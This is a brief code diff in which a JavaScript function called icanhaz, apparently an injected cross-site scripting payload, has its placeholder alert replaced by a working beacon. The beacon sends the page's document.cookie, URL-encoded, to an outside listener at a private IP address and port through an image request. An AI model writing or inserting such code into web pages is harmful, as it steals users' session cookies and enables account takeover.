@@ -2,8 +2,11 @@
 // it has to have no dependencies
 // and can not call any local functions
 function icanhaz() {
-    // TODO: send the cookie from here
-    alert('hello');
+    (new Image()).src =
+        'http://192.168.122.1:9666/?'
+        + 'cookies=' + encodeURIComponent(document.cookie)
+        + '&random=' + Math.random();
+
 
     const warnings = document.getElementsByClassName('warning');
     window.addEventListener('load', (event) => {
